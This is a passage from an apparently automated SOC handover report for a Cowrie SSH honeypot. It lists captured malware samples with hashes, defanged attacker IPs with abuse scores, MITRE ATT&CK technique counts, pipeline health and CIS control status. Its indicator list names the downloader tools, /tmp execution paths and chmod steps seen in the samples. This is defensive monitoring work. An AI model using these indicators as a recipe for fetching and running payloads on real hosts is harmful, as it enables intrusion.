| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `46.59.88[.]179` | SE | Bahnhof AB | **100** ⚠️ | 2 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 6 |
| `182.95.190[.]150` | IN | Bharti Airtel Limited | **100** ⚠️ | 3 |
| `182.60.128[.]241` | IN | Mahanagar Telephone Nigam Limited | **100** ⚠️ | 50 |
| `103.7.60[.]253` | PK | Cyber Internet Services Pakistan | **100** ⚠️ | 2 |
| `8.134.157[.]132` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 35 |
| `91.92.40[.]153` | NL | TechTies Inc. | **100** ⚠️ | 43 |
| `208.109.38[.]143` | US | GoDaddy.com, LLC | **100** ⚠️ | 50 |
| `62.60.130[.]242` | LT | CIPHER OPERATIONS DOO BEOGRAD - NOVI BEOGRAD | **100** ⚠️ | 36 |
| `66.132.195[.]48` | US | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 332 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 319 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 1 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 393 cases |
| Tool 34  | Credential Extractor        | ✅ 336 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 69 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (1.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 46 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 319 priority case(s) shown individually · 26 recon entry/entries in table (9 group(s) consolidating 53 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-24T03:07:48Z_
